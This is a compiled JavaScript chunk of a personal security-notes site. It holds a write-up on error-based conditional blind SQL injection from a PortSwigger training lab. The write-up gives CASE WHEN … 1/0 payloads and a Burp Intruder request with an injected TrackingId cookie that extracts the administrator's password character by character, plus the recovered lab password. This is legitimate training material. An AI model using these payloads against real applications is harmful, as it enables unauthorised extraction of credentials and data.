"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[848],{3905:function(e,n,t){t.d(n,{Zo:function(){return p},kt:function(){return f}});var i=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);n&&(i=i.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,i)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,i,r=function(e,n){if(null==e)return{};var t,i,r={},o=Object.keys(e);for(i=0;i<o.length;i++)t=o[i],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(i=0;i<o.length;i++)t=o[i],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var c=i.createContext({}),l=function(e){var n=i.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},p=function(e){var n=l(e.components);return i.createElement(c.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return i.createElement(i.Fragment,{},n)}},u=i.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,c=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=l(t),f=r,h=u["".concat(c,".").concat(f)]||u[f]||d[f]||o;return t?i.createElement(h,a(a({ref:n},p),{},{components:t})):i.createElement(h,a({ref:n},p))}));function f(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,a=new Array(o);a[0]=u;var s={};for(var c in n)hasOwnProperty.call(n,c)&&(s[c]=n[c]);s.originalType=e,s.mdxType="string"==typeof e?e:r,a[1]=s;for(var l=2;l<o;l++)a[l]=t[l];return i.createElement.apply(null,a)}return i.createElement.apply(null,t)}u.displayName="MDXCreateElement"},5945:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return s},contentTitle:function(){return c},metadata:function(){return l},toc:function(){return p},default:function(){return u}});var i=t(7462),r=t(3366),o=(t(7294),t(3905)),a=["components"],s={tags:["sqli"]},c=void 0,l={unversionedId:"portswigger/Sql-injection/Condition based",id:"portswigger/Sql-injection/Condition based",title:"Condition based",description:"Condition based Sql injection",source:"@site/docs/portswigger/Sql-injection/Condition based.md",sourceDirName:"portswigger/Sql-injection",slug:"/portswigger/Sql-injection/Condition based",permalink:"/Cybernotes/docs/portswigger/Sql-injection/Condition based",tags:[{label:"sqli",permalink:"/Cybernotes/docs/tags/sqli"}],version:"current",frontMatter:{tags:["sqli"]},sidebar:"tutorialSidebar",previous:{title:"Blind SQL injection",permalink:"/Cybernotes/docs/portswigger/Sql-injection/Blind sqli"},next:{title:"Information-schema",permalink:"/Cybernotes/docs/portswigger/Sql-injection/Information-schema"}},p=[{value:"Condition based Sql injection",id:"condition-based-sql-injection",children:[],level:2},{value:"Challenge",id:"challenge",children:[],level:2}],d={toc:p};function u(e){var n=e.components,s=(0,r.Z)(e,a);return(0,o.kt)("wrapper",(0,i.Z)({},d,s,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"condition-based-sql-injection"},"Condition based Sql injection"),(0,o.kt)("p",null,"In the preceding example, suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data. The preceding technique will not work, because injecting different Boolean conditions makes no difference to the application's responses."),(0,o.kt)("p",null,"In this situation, it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition. This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition."),(0,o.kt)("p",null,"To see how this works, suppose that two requests are sent containing the following ",(0,o.kt)("inlineCode",{parentName:"p"},"TrackingId")," cookie values in turn:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a")),(0,o.kt)("p",null,"These inputs use the ",(0,o.kt)("inlineCode",{parentName:"p"},"CASE")," keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the ",(0,o.kt)("inlineCode",{parentName:"p"},"CASE")," expression evaluates to ",(0,o.kt)("inlineCode",{parentName:"p"},"'a'"),", which does not cause any error. With the second input, it evaluates to ",(0,o.kt)("inlineCode",{parentName:"p"},"1/0"),", which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true."),(0,o.kt)("p",null,"Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a")),(0,o.kt)("h2",{id:"challenge"},"Challenge"),(0,o.kt)("p",null,"--\x3e i added this payload in intruder"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"GET /filter?category=Tech+gifts HTTP/1.1\nHost: acea1f411f956f08807e2da400290063.web-security-academy.net\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: TrackingId=wkQ0FTyX6kLxoXL0'||(SELECT CASE WHEN (SUBSTR(password,\xa71\xa7,1)='\xa7m\xa7') THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=ULjDh6MI3mR1TiRhqUDd2ls5ixNrVWLm\nUpgrade-Insecure-Requests: 1\n")),(0,o.kt)("p",null,"--\x3e and i got this results"),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(5590).Z,width:"1325",height:"747"})),(0,o.kt)("p",null,"--\x3e after assembling them i got this password :"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"8vzkeohgdu9ilptqy1wd")),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(3510).Z,width:"1403",height:"717"})))}u.isMDXComponent=!0},3510:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20211003073612-19499dad8165d1ff59c0c40c34f95c47.png"},5590:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20211003074958-31bbc5bdb17be9a1ac2c72862417968a.png"}}]);